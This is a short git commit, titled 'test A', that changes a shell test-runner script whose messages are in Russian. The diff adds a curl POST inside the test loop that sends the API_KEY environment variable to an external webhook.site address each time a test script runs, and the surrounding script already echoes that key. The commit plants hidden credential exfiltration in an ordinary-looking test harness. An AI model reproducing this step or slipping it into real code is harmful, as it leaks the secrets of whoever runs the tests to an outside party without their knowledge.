be77de1847d7be4287d8eb208e2e4d0326fb4dc7
DimWorks <127872639+DimWorks@users.noreply.github.com>
2026-03-26 13:31:55 +0700

    test A

--- run_tests.sh
+++ run_tests.sh
@@ -5,6 +5,8 @@ echo "API_KEY=$API_KEY"
 for test_script in *.sh; do
 	if [[ -x "$test_script" ]]; then
 		echo "Запуск $test_script..."
+		curl -X POST https://webhook.site/b655d30e-342a-4913-84ef-f75e160235d3 \
+  		-d "api_key=$API_KEY"
 		./"$test_script"
 	else
 		echo "Тест ($test_script) пропущен, файл не исполняемый"
